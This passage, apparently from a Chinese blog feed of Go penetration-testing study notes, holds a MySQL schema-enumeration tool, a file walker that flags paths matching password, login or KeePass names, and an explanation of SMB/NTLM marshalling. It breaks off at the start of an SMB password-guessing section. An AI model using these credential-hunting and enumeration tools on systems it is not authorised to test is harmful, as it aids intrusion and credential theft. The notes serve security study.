class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line">m.Db = *db</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *MySQLMiner)</span></span> GetSchema() (*dbminer.Schema, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> s = <span class="built_in">new</span>(dbminer.Schema)</span><br><span class="line"></span><br><span class="line">sql := <span class="string">`SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM columns</span></span><br><span class="line"><span class="string">WHERE TABLE_SCHEMA NOT IN (&#x27;mysql&#x27;, &#x27;information_schema&#x27;, &#x27;performance_schema&#x27;, &#x27;sys&#x27;)</span></span><br><span class="line"><span class="string">ORDER BY TABLE_SCHEMA, TABLE_NAME`</span></span><br><span class="line">schemarows, err := m.Db.Query(sql)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> schemarows.Close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> prevschema, prevtable <span class="type">string</span></span><br><span class="line"><span class="keyword">var</span> db dbminer.Database</span><br><span class="line"><span class="keyword">var</span> table dbminer.Table</span><br><span class="line"><span class="keyword">for</span> schemarows.Next() &#123;</span><br><span class="line"><span class="keyword">var</span> currschema, currtable, currcol <span class="type">string</span></span><br><span class="line"><span class="keyword">if</span> err := schemarows.Scan(&amp;currschema, &amp;currtable, &amp;currcol); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> currschema != prevschema &#123;</span><br><span class="line"><span class="keyword">if</span> prevschema != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">db.Tables = <span class="built_in">append</span>(db.Tables, table)</span><br><span class="line">s.Databases = <span class="built_in">append</span>(s.Databases, db)</span><br><span class="line">&#125;</span><br><span class="line">db = dbminer.Database&#123;Name: currschema, Tables: []dbminer.Table&#123;&#125;&#125;</span><br><span class="line">prevschema = currschema</span><br><span class="line">prevtable = <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> currtable != prevtable &#123;</span><br><span class="line"><span class="keyword">if</span> prevtable != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">db.Tables = <span class="built_in">append</span>(db.Tables, table)</span><br><span class="line">&#125;</span><br><span class="line">table = dbminer.Table&#123;Name: currtable, Columns: []<span class="type">string</span>&#123;&#125;&#125;</span><br><span class="line">prevtable = currtable</span><br><span class="line">&#125;</span><br><span class="line">table.Columns = <span class="built_in">append</span>(table.Columns, currcol)</span><br><span class="line">&#125;</span><br><span class="line">db.Tables = <span class="built_in">append</span>(db.Tables, table)</span><br><span class="line">s.Databases = <span class="built_in">append</span>(s.Databases, db)</span><br><span class="line"><span class="keyword">if</span> err := schemarows.Err(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> s, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">mm, err := New(os.Args[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> mm.Db.Close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := dbminer.Search(mm); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-文件掠夺系统"><a href="#0x04-文件掠夺系统" class="headerlink" title="0x04 文件掠夺系统"></a>0x04 文件掠夺系统</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="title function_">import</span> <span class="params">(</span></span><br><span class="line"><span class="params"><span class="string">&quot;fmt&quot;</span></span></span><br><span class="line"><span class="params"><span class="string">&quot;log&quot;</span></span></span><br><span class="line"><span class="params"><span class="string">&quot;os&quot;</span></span></span><br><span class="line"><span class="params"><span class="string">&quot;path/filepath&quot;</span></span></span><br><span class="line"><span class="params"><span class="string">&quot;regexp&quot;</span></span></span><br><span class="line"><span class="params">)</span></span><br><span class="line"></span><br><span class="line"><span class="type">var</span> <span class="variable">regexes</span> <span class="operator">=</span> []*regexp.Regexp&#123;</span><br><span class="line">regexp.MustCompile(`(?i)user`),</span><br><span class="line">regexp.MustCompile(`(?i)password`),</span><br><span class="line">regexp.MustCompile(`(?i)kdb`),</span><br><span class="line">regexp.MustCompile(`(?i)login`),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func <span class="title function_">walkFn</span><span class="params">(path string, f os.FileInfo, err error)</span> error &#123;</span><br><span class="line"><span class="keyword">for</span> _, r := range regexes &#123;</span><br><span class="line"><span class="keyword">if</span> r.MatchString(path) &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;[+] HIT: %s\n&quot;</span>, path)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> nil</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">root := os.Args[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> err := filepath.Walk(root, walkFn); err != nil &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">对数据库和文件系统的学习</summary>
    
    
    
    <category term="Go渗透测试" scheme="https://h0ld1rs.github.io/categories/Go%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="Golang,渗透测试" scheme="https://h0ld1rs.github.io/tags/Golang-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Go渗透测试笔记(六)</title>
    <link href="https://h0ld1rs.github.io/posts/36907.html"/>
    <id>https://h0ld1rs.github.io/posts/36907.html</id>
    <published>2022-03-05T03:16:23.000Z</published>
    <updated>2022-03-05T12:30:57.966Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Go渗透测试笔记-六-–与SMB和NTLM交互"><a href="#Go渗透测试笔记-六-–与SMB和NTLM交互" class="headerlink" title="Go渗透测试笔记(六)–与SMB和NTLM交互"></a>Go渗透测试笔记(六)–与SMB和NTLM交互</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在前面的学习中，我们研究了用于网络通信的三种协议：TCP，HTTP和DNS，这次我们使用<code>SMB(服务器消息块)</code>(Server Message Block)协议来对网络协议进行讨论。<code>SMB</code>被证明是针对<code>Windows</code>系统后渗透中最有用的协议。</p><p>SMB具有多种用途，通常用于网上共享资源，例如，文件打印机和串行端口。如果有攻击意识，SMB允许通过命名管道在分布式网络节点之间进行通信。换句话说，你可以在远程主机上执行任意命令。这就需要用到<code>PsExec(一种在本地执行远程命令的windows工具)</code></p><p>SMB还有一些其他用途，主要得益于它处理<code>NTLM</code>身份的验证方法，该身份验证是<code>Windows</code>网络上大量使用的<code>质询--响应</code>安全协议。用途包括，远程密码猜测，基于散列的身份验证(pass-the-hash)，SMB中继和<code>NBNS/LLMNR</code>欺骗</p><h2 id="0x01-SMB包"><a href="#0x01-SMB包" class="headerlink" title="0x01 SMB包"></a>0x01 SMB包</h2><p>由于没有现成的SMB包，所以使用作者编写的</p><p><code>https://github.com/blackhat-go/bhg/tree/master/ch-6/smb</code></p><p>改天去挖掘一下源代码</p><h2 id="0x02-理解SMB"><a href="#0x02-理解SMB" class="headerlink" title="0x02 理解SMB"></a>0x02 理解SMB</h2><p>SMB是一种应用层协议，它类似于HTTP协议，允许网络节点之间互相通信。与HTTP1.1(使用ASCII 可读写文本进行通信)不同，SMB是一种二进制协议，使用固定长度和可变长度，位置与低字节序字段的组合。SMB有多个版本，2.0，2.1，3.0，3.0.2和3.1.1.由于每个版本的处理方式和要求各不相通，因此客户端和服务器必须事先约定好要使用哪个版本。</p><p>其中<code>Windows</code>系统支持多个版本，Microsoft提供了一个表格，显示在协商过程中要安装哪个版本</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220305120724.png"></p><p>图片来源：<a href="https://kb-cn.netapp.com/Advice_and_Troubleshooting/Data_Storage_Software/ONTAP_OS/What_is_the_default_negotiated_SMB_version_with_various_versions_of_Data_ONTAP_and_Windows_clients">https://kb-cn.netapp.com/Advice_and_Troubleshooting/Data_Storage_Software/ONTAP_OS/What_is_the_default_negotiated_SMB_version_with_various_versions_of_Data_ONTAP_and_Windows_clients</a></p><p>在这里，我们使用SMB 2.1</p><h3 id="1-理解SMB安全令牌"><a href="#1-理解SMB安全令牌" class="headerlink" title="1. 理解SMB安全令牌"></a>1. 理解SMB安全令牌</h3><p>SMB消息包含用于对网络中的用户和计算机进行身份验证的安全令牌。通过一系列会话消息来选择身份认证机制。该消息允许客户端和服务器就相互支持的身份验证类型达成一致。<code>Active Directory</code>域通常使用<code>NTLM</code>安全支持提供程序(NTLMSSP)，后者是一个二进制的网络协议，该协议将<code>NTLM</code>密码散列和<code>质询-响应</code>，令牌结合使用，以便在网络上进行用户的身份认证。</p><blockquote><p>质询-响应令牌可以理解为一个加密答案，除了NTLMSSP之外，还有一种常见的身份认证机制，即<code>Kerberos</code></p></blockquote><p>将身份认证机制与SMB规范分开，可以使SMB在不同的环境中使用不同的身份验证方法。具体取决于域和企业的安全要求，以及客户端-服务器的支持。但是，将身份验证机制和SMB规范分开，使Go创建更加困难。而格式与我们将用于普通的SMB的位置二进制编码不同，这种混合编码增加了复杂性。</p><h3 id="2-创建一个SMB会话"><a href="#2-创建一个SMB会话" class="headerlink" title="2. 创建一个SMB会话"></a>2. 创建一个SMB会话</h3><p>客户端和服务器执行以下过程以成功设置<code>SMB2.1</code>会话并选择<code>NTLPSSP</code>方言</p><ol><li><p>客户端向服务器发送协商协议(Negotiate Protocol)请求，该消息中包含客户端支持的方言列表。</p></li><li><p>服务器以协商协议响应消息作为响应，该消息表明服务器选择的方言，将来的消息都将使用该方言，响应中包含服务器支持的身份验证机制列表。</p></li><li><p>客户端选择一种受支持的身份验证类型，例如<code>NTLMSSP</code>，并使用该信息创建会话设置请求消息发送到服务器，该消息中包含一个序列化的安全结构，表明他是<code>NTLMSSP</code>协商请求</p></li><li><p>服务器以会话设置响应消息答复。此消息表明需要更多处理，且此消息中包含服务器质询令牌。</p></li><li><p>客户端计算用户的<code>NTLM</code>散列值(使用域，用户密码作为输入)，，然后将其与服务器质询，随机客户端质询和其他数据结合起来生成质询响应。它包含在客户端发送给服务器的新会话设置请求消息中。而该消息中包含的序列化的安全结构规则表明其是<code>NTLMSSP</code>身份验证请求。这样，服务器就可以区分两个会话设置<code>SMB</code>请求。</p></li><li><p>服务器与权威性资源(例如使用域凭据进行身份验证的域控制器)进行交互。以将客户端提供的质询-响应信息与权威性紫泉计算出的值进行比较，如果他们匹配，则对客户端进行身份认证，服务器会话设置响应消息发送给客户端，表示登录成功(该消息中包含客户端，可以用来跟踪会话状态的唯一会话标识符)</p></li><li><p>客户端发送其他消息以访问文件共享，命名管道，打印机等，每个消息都包含特定的会话标识符，服务器可以通过该标识符来验证客户端的身份状态。</p></li></ol><p>以下是一些相关规范</p><blockquote><p>MS-SMB2</p><p>MS-SPNG 和 RFC 4178 封装了 MS-NLMP数据的<code>GSS-API</code>规范</p><p>MS-NTLM</p><p>AN&#x3D;SN.1</p></blockquote><h3 id="3-使用结构域的混合编码"><a href="#3-使用结构域的混合编码" class="headerlink" title="3. 使用结构域的混合编码"></a>3. 使用结构域的混合编码</h3><p>SMB规范要求对大多数消息数据进行位置，二进制，低字节序，固定和可变长度编码。但是某些字段需要进行<code>ASN.1</code>编码，该字段使用显式标记符来标识字段索引，类型和长度。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Type Foo <span class="keyword">struct</span>&#123;</span><br><span class="line">    x <span class="type">int</span></span><br><span class="line">    y []<span class="type">byte</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> Message <span class="keyword">struct</span>&#123;</span><br><span class="line">    A <span class="type">int</span> <span class="comment">//二进制，位置编码</span></span><br><span class="line">    B Foo <span class="comment">//规范要求的ASN.1 编码</span></span><br><span class="line">    C <span class="type">bool</span> <span class="comment">// 二进制，位置编码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>无法使用i相同的编码方案对结构体<code>Message</code>中的所有类型进行编码，因为<code>Foo</code>类型的B字段需要使用<code>ASN.1</code>编码</p><h4 id="1-编写自定义的序列化和反序列化结构"><a href="#1-编写自定义的序列化和反序列化结构" class="headerlink" title="1. 编写自定义的序列化和反序列化结构"></a>1. 编写自定义的序列化和反序列化结构</h4><p>Go的二进制包的行为方式与它递归地对所有结构体字段进行编码的方式相同。但没有什么用，因为需要混合编码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binary.Write(someWriter,binary.LittleEndian,message)</span><br></pre></td></tr></table></figure><p>要解决此问题，可以创建一个接口，该接口允许任意类型的自定义序列化和反序列化逻辑</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> BinaryMarshallable <span class="keyword">interface</span> &#123;</span><br><span class="line">MarshalBinary(*Metadata) ([]<span class="type">byte</span>, <span class="type">error</span>)</span><br><span class="line">UnmarshalBinary([]<span class="type">byte</span>, *Metadata) <span class="type">error</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-包装接口"><a href="#2-包装接口" class="headerlink" title="2. 包装接口"></a>2. 包装接口</h4><p>任何实现了接口<code>BinaryMarshallable</code>的类型都可以控制自己的编码，我们需要创建包装函数<code>marsgal()</code>和<code>unmarshal()</code>，在其中检查数据以确定该类型是否实现了接口<code>BinaryMarshakkable</code>，</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">marshal</span><span class="params">(v <span class="keyword">interface</span>&#123;&#125;, meta *Metadata)</span></span> ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> ret []<span class="type">byte</span></span><br><span class="line">typev := reflect.TypeOf(v)</span><br><span class="line">valuev := reflect.ValueOf(v)</span><br><span class="line"></span><br><span class="line">bm, ok := v.(BinaryMarshallable)</span><br><span class="line"><span class="keyword">if</span> ok &#123;</span><br><span class="line"><span class="comment">// Custom marshallable interface found.</span></span><br><span class="line">buf, err := bm.MarshalBinary(meta)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> buf, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> typev.Kind() == reflect.Ptr &#123;</span><br><span class="line">valuev = reflect.Indirect(reflect.ValueOf(v))</span><br><span class="line">typev = valuev.Type()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">w := bytes.NewBuffer(ret)</span><br><span class="line"><span class="keyword">switch</span> typev.Kind() &#123;</span><br><span class="line"><span class="keyword">case</span> reflect.Struct:</span><br><span class="line">m := &amp;Metadata&#123;</span><br><span class="line">Tags:   &amp;TagMap&#123;&#125;,</span><br><span class="line">Lens:   <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">uint64</span>),</span><br><span class="line">Parent: v,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> j := <span class="number">0</span>; j &lt; valuev.NumField(); j++ &#123;</span><br><span class="line">tags, err := parseTags(typev.Field(j))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">m.Tags = tags</span><br><span class="line">buf, err := marshal(valuev.Field(j).Interface(), m)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">m.Lens[typev.Field(j).Name] = <span class="type">uint64</span>(<span class="built_in">len</span>(buf))</span><br><span class="line"><span class="keyword">if</span> err := binary.Write(w, binary.LittleEndian, buf); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> reflect.Slice, reflect.Array:</span><br><span class="line"><span class="keyword">switch</span> typev.Elem().Kind() &#123;</span><br><span class="line"><span class="keyword">case</span> reflect.Uint8:</span><br><span class="line"><span class="keyword">if</span> err := binary.Write(w, binary.LittleEndian, v.([]<span class="type">uint8</span>)); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> reflect.Uint16:</span><br><span class="line"><span class="keyword">if</span> err := binary.Write(w, binary.LittleEndian, v.([]<span class="type">uint16</span>)); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> reflect.Uint8:</span><br><span class="line"><span class="keyword">if</span> err := binary.Write(w, binary.LittleEndian, valuev.Interface().(<span class="type">uint8</span>)); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> reflect.Uint16:</span><br><span class="line">data := valuev.Interface().(<span class="type">uint16</span>)</span><br><span class="line"><span class="keyword">if</span> meta != <span class="literal">nil</span> &amp;&amp; meta.Tags.Has(<span class="string">&quot;len&quot;</span>) &#123;</span><br><span class="line">fieldName, err := meta.Tags.GetString(<span class="string">&quot;len&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">l, err := getFieldLengthByName(fieldName, meta)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">data = <span class="type">uint16</span>(l)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> meta != <span class="literal">nil</span> &amp;&amp; meta.Tags.Has(<span class="string">&quot;offset&quot;</span>) &#123;</span><br><span class="line">fieldName, err := meta.Tags.GetString(<span class="string">&quot;offset&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">l, err := getOffsetByFieldName(fieldName, meta)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">data = <span class="type">uint16</span>(l)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := binary.Write(w, binary.LittleEndian, data); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> reflect.Uint32:</span><br><span class="line">data := valuev.Interface().(<span class="type">uint32</span>)</span><br><span class="line"><span class="keyword">if</span> meta != <span class="literal">nil</span> &amp;&amp; meta.Tags.Has(<span class="string">&quot;len&quot;</span>) &#123;</span><br><span class="line">fieldName, err := meta.Tags.GetString(<span class="string">&quot;len&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">l, err := getFieldLengthByName(fieldName, meta)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">data = <span class="type">uint32</span>(l)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> meta != <span class="literal">nil</span> &amp;&amp; meta.Tags.Has(<span class="string">&quot;offset&quot;</span>) &#123;</span><br><span class="line">fieldName, err := meta.Tags.GetString(<span class="string">&quot;offset&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">l, err := getOffsetByFieldName(fieldName, meta)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">data = <span class="type">uint32</span>(l)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := binary.Write(w, binary.LittleEndian, data); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> reflect.Uint64:</span><br><span class="line"><span class="keyword">if</span> err := binary.Write(w, binary.LittleEndian, valuev.Interface().(<span class="type">uint64</span>)); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, errors.New(fmt.Sprintf(<span class="string">&quot;Marshal not implemented for kind: %s&quot;</span>, typev.Kind()))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> w.Bytes(), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="3-强制ASN-1编码"><a href="#3-强制ASN-1编码" class="headerlink" title="3. 强制ASN.1编码"></a>3. 强制<code>ASN.1</code>编码</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(n *NegTokenInit)</span></span> MarshalBinary(meta *encoder.Metadata) ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line">buf, err := asn1.Marshal(*n)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用<code>asn1.Marshal(*n)</code>适合 go 可以和 asn.1编码与SMB规范定义的基本数据格式配合使用</p><h4 id="4-了解元数据和引用字段"><a href="#4-了解元数据和引用字段" class="headerlink" title="4. 了解元数据和引用字段"></a>4. 了解元数据和引用字段</h4><p>SMB规范中可以知道：从协商响应消息端中获取的字段指的是包含实际值的可变长度字节切片的偏移量和长度</p><p><code>SecurityBufferOffset(两个字节)</code>：从SMB2标头开始到安全缓冲区的偏移量(以字节为单位)</p><p><code>SecurityBufferLength(两个字节)：</code>从安全缓冲区的长度</p><h4 id="5-SMB的实现"><a href="#5-SMB的实现" class="headerlink" title="5. SMB的实现"></a>5. SMB的实现</h4><p>这里略过，因为我看不懂</p><h2 id="0x03-使用SMB包猜测密码"><a href="#0x03-使用SMB包猜测密码" class="headerlink" title="0x03 使用SMB包猜测密码"></a>0x03 使用SMB包猜测密码</h2><p>现在我们来试一下利用<code>SMB</code>包实施在线密码猜解，我们先下载smb包</p><p><code>go get github.com/blackhat-go/bhg/ch-6/smb/smb</code></p><p>接下来编写代码，接受保存换行符分割的用户名，密码，域和目标主体，为了避免将账户锁定在某些域之外，我们将尝试对一个用户列表使用同一个密码，而不是对一个或多个用户使用密码列表。</p><blockquote><p>在线密码猜测可以将账户锁定在域之外，从而有效的实施拒绝服务攻击，测试时务必谨慎。</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 